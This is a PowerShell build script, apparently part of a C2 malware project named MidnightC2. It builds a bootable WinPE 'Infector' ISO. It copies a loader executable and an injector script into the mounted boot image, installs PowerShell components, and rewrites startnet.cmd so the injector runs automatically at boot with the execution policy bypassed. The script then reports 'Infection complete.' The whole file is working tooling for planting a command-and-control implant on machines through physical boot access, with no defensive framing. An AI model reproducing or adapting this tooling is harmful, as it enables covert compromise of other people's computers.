# build_winpe.ps1 - Automates creation of MidnightC2 Injection ISO
# Requires: Windows ADK and WinPE Add-on installed.

$peWorkDir = "C:\MidnightWinPE"
$adkPath = "C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit"
$winpeBaseDir = "$adkPath\Windows Preinstallation Environment\amd64\en-us"
$winpeBase = "$winpeBaseDir\winpe.wim"
$copypeCmd = "$adkPath\Deployment Tools\CopyPE.cmd"
$oscdimg = "$adkPath\Deployment Tools\amd64\Oscdimg\oscdimg.exe"

# --- Common UI Functions ---
function Write-Step($msg) { Write-Host "`n[*] $msg" -ForegroundColor Cyan }
function Write-ErrorMsg($msg) { Write-Host "[X] $msg" -ForegroundColor Red }
function Write-Info($msg) { Write-Host "[i] $msg" -ForegroundColor Gray }
function Write-Success($msg) { Write-Host "[+] $msg" -ForegroundColor Green }
# ---------------------------

# Check for WinPE Add-on
if (-not (Test-Path $winpeBase)) {
    Write-ErrorMsg "WinPE Add-on not found!"
    Write-Host "Please download and install both from these links:" -ForegroundColor Yellow
    Write-Host "1. ADK: https://go.microsoft.com/fwlink/?linkid=2196127" -ForegroundColor White
    Write-Host "2. WinPE Add-on: https://go.microsoft.com/fwlink/?linkid=2196224" -ForegroundColor White
    Write-Host "`nOr, place a 'boot.wim' file from any Windows ISO into: C:\MidnightWinPE\custom_boot.wim" -ForegroundColor Gray
    
    if (-not (Test-Path "C:\MidnightWinPE\custom_boot.wim")) {
        exit
    }
    $winpeBase = "C:\MidnightWinPE\custom_boot.wim"
    Write-Info "Using custom boot.wim found at $winpeBase"
}

# 1. Cleanup old build
if (Test-Path $peWorkDir) {
    Write-Step "Cleaning up old build directory..."
    dism.exe /Cleanup-Mountpoints /Quiet | Out-Null
    # Try multiple times since DISM loves to lock files
    for($i=0; $i -lt 3; $i++){
        Remove-Item $peWorkDir -Recurse -Force -ErrorAction SilentlyContinue
        if(-not (Test-Path $peWorkDir)) { break }
        Start-Sleep -Seconds 2
    }
}

# 2. Create WinPE Work Dir structure manually
Write-Step "Initializing WinPE Environment Structure..."
New-Item -Path "$peWorkDir\media\sources" -ItemType Directory -Force | Out-Null
New-Item -Path "$peWorkDir\mount" -ItemType Directory -Force | Out-Null
New-Item -Path "$peWorkDir\fwfiles" -ItemType Directory -Force | Out-Null

if (Test-Path "$adkPath\Deployment Tools\amd64\Oscdimg") {
    Copy-Item "$adkPath\Deployment Tools\amd64\Oscdimg\efisys.bin" -Destination "$peWorkDir\fwfiles\" -ErrorAction SilentlyContinue
    Copy-Item "$adkPath\Deployment Tools\amd64\Oscdimg\etfsboot.com" -Destination "$peWorkDir\fwfiles\" -ErrorAction SilentlyContinue
}

# 3. Mount Boot Image
Write-Step "Mounting boot image..."
$wimPath = "$peWorkDir\media\sources\boot.wim"
Copy-Item $winpeBase -Destination $wimPath -Force
$mountDir = "$peWorkDir\mount"
dism.exe /Mount-Wim /WimFile:$wimPath /Index:1 /MountDir:$mountDir

# 4. Inject Payload and Script
Write-Step "Injecting MidnightC2 Payload and Injector..."
$loaderSrc = ".\MidnightLoader\target\release\midnight_loader.exe"
if (-not (Test-Path $loaderSrc)) { $loaderSrc = ".\midnight_loader.exe" }
Copy-Item $loaderSrc -Destination "$mountDir\Windows\midnight_loader.exe" -Force
Copy-Item ".\winpe_injector.ps1" -Destination "$mountDir\Windows\winpe_injector.ps1" -Force

# 5. Inject PowerShell Optional Components (Required for standard WIMs)
Write-Step "Injecting PowerShell Optional Components..."
$ocPath = "$adkPath\Windows Preinstallation Environment\amd64\WinPE_OCs"
if (Test-Path $ocPath) {
    $packages = @(
        "WinPE-WMI.cab", "en-us\WinPE-WMI_en-us.cab",
        "WinPE-NetFx.cab", "en-us\WinPE-NetFx_en-us.cab",
        "WinPE-Scripting.cab", "en-us\WinPE-Scripting_en-us.cab",
        "WinPE-PowerShell.cab", "en-us\WinPE-PowerShell_en-us.cab"
    )
    foreach ($pkg in $packages) {
        $pkgPath = Join-Path $ocPath $pkg
        if (Test-Path $pkgPath) {
            dism.exe /Image:$mountDir /Add-Package /PackagePath:$pkgPath /Quiet
        }
    }
    Write-Success "PowerShell components injected."
}

# 6. Configure Auto-Run (startnet.cmd)
Write-Step "Configuring Auto-Run in startnet.cmd..."
$startnet = "$mountDir\Windows\System32\startnet.cmd"
$autoCmd = "@echo off`r`n" +
           "wpeinit`r`n" +
           "echo.`r`n" +
           "echo ========================================`r`n" +
           "echo   MidnightC2 Auto-Infector Starting...`r`n" +
           "echo ========================================`r`n" +
           "echo.`r`n" +
           "powershell.exe -NoProfile -ExecutionPolicy Bypass -File X:\Windows\winpe_injector.ps1 -Auto`r`n" +
           "if %ERRORLEVEL% NEQ 0 (`r`n" +
           "    echo.`r`n" +
           "    echo [X] ERROR: Injector failed with code %ERRORLEVEL%`r`n" +
           "    pause`r`n" +
           ") else (`r`n" +
           "    echo.`r`n" +
           "    echo [SUCCESS] Infection complete.`r`n" +
           "    echo You can now remove USB and Reboot.`r`n" +
           "    pause`r`n" +
           ")`r`n" +
           "cmd.exe`r`n"

Set-Content -Path $startnet -Value $autoCmd -Encoding Ascii

# 7. Commit and Unmount
Write-Step "Unmounting and committing changes..."
dism.exe /Unmount-Wim /MountDir:$mountDir /Commit

# 8. Generate ISO
Write-Step "Generating Bootable ISO..."
$isoPath = "D:\MidnightC2_Infector.iso"
if (Test-Path $oscdimg) {
    & $oscdimg -n "-bootdata:2#p0,e,b$peWorkDir\fwfiles\etfsboot.com#pEF,e,b$peWorkDir\fwfiles\efisys.bin" "$peWorkDir\media" "$isoPath"
}

Write-Host "`n[SUCCESS] ISO Path: $isoPath" -ForegroundColor Green
